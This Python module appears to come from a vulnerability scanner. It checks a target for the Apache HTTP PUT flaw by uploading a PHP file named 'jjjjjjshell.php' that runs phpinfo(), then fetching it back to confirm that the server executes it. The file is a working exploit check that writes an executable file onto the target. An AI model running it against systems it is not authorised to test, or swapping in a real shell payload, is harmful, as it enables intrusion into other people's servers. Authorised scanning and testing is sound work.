#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests, urllib3
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet
urllib3.disable_warnings()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class ApachePutScan:
    def main(self,target):
        OutPrintInfo("Apache", "开始检测Apache-PUT漏洞...")
        host=target[0].strip('/ ')
        ssl = target[1]
        header = target[2]
        proxy = target[3]
        timeout = int(target[4])

        req = ReqSet(header=header, proxy=proxy)
        self.headers = req["header"]
        self.proxy = req["proxy"]
        # self.proxy = {"http":proxy,"https":proxy}

        url = host+"/jjjjjjshell.php"
        data = "<?php phpinfo();?>"
        response = requests.put(url, verify=ssl,proxies=self.proxy,data=data,headers=self.headers,timeout=timeout)
        ck = requests.get(url,verify=ssl,proxies=self.proxy,headers=self.headers,timeout=timeout)
        if "disable_functions" in ck.text:
            OutPrintInfo("Apache",f"Dir {url}")
            # with open("./result/apachePut.txt", "a") as w:
            #     w.write(f"{url}\n")
        else:
            OutPrintInfo("Apache", "目标不存在Apache-PUT漏洞")
        OutPrintInfo("Apache", "检测结束")

